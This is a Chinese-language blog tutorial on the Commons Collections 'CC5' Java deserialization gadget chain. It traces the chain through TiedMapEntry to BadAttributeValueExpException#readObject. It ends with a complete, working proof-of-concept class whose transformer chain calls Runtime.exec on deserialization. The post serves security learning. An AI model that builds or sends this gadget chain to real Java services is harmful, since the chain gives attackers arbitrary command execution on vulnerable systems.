---
title: "Java反序列化CC5链"
date: 2025-06-28T19:50:24+08:00
summary: "Java反序列化CC5链"
url: "/posts/Java反序列化CC5链/"
categories:
  - "javasec"
tags:
  - "javasec"
draft: false
---

## 0x01链子分析

CC5的话其实就是在CC1的入口类上做了一点改动，从CC1中利用AnnotationInvocationHandler#readObject()换成利用BadAttributeValueExpException#readObject()

后半段也是沿用了CC1的LazyMap#get()后半段

然后我们来看一下

## 0x02版本

jdk：jdk8u65
CC：Commons-Collections 3.2.1

## 0x03链子寻找

那我们继续倒推，找一下能调用get的方法

### TiedMapEntry#getValue()

发现TiedMapEntry类中的getValue方法调用了get方法

```java
    public Object getValue() {
        return map.get(key);
    }
```

### TiedMapEntry#toString()

然后TiedMapEntry类的toString方法又调用了getValue方法

```java
    public String toString() {
        return getKey() + "=" + getValue();
    }
```

### BadAttributeValueExpException#readObject()

往前推，发现在BadAttributeValueExpException的readObject方法调用了toString方法

```java
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);

        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
```

我们看看这里的valObj参数是否可控

```java
ObjectInputStream.GetField gf = ois.readFields();
Object valObj = gf.get("val", null);
```

先调用readFields从流中读取了所有的持久化字段，然后调用get()方法得到了名字是val的字段。

```java
private Object val;
```

所以我们只要val变量可控那valObj就是可控的

同时我们看一下该类是否接入序列化接口

```java
public class BadAttributeValueExpException extends Exception  
public class Exception extends Throwable
public class Throwable implements Serializable
```

根据这里的继承关系可以发现是接入了序列化接口的

## 0x04POC编写

看一下构造方法

```java
    public BadAttributeValueExpException (Object val) {
        this.val = val == null ? null : val.toString();
    }
```

我发现这里也会调用toString()方法，所以这里也会触发，那可能会导致反序列化的时候不会触发，那我们用之前的方法，先在给BadAttributeValueExpException传参数的时候不传入tiedMapEntry对象，然后反射修改val的值为tiedMapEntry就行。

构造函数是公共属性，那我们直接写一下poc

### POC

```java
package POC.CC5;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC5 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer =  new ChainedTransformer(transformers);

        HashMap<Object,Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);

        //CC5的开头
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"aaa");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        
        //反射修改val为tiedMapEntry
        Class a = Class.forName("javax.management.BadAttributeValueExpException");
        Field valfield = a.getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(badAttributeValueExpException,tiedMapEntry);

        //序列化和反序列化
        serialize(badAttributeValueExpException);
        unserialize("CC5.txt");
    }
    //定义序列化操作
    public static void serialize(Object object) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("CC5.txt"));
        oos.writeObject(object);
        oos.close();
    }

    //定义反序列化操作
    public static void unserialize(String filename) throws Exception{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        ois.readObject();
    }
}

```

当然结合CC3去触发任意字节码加载也是可以的
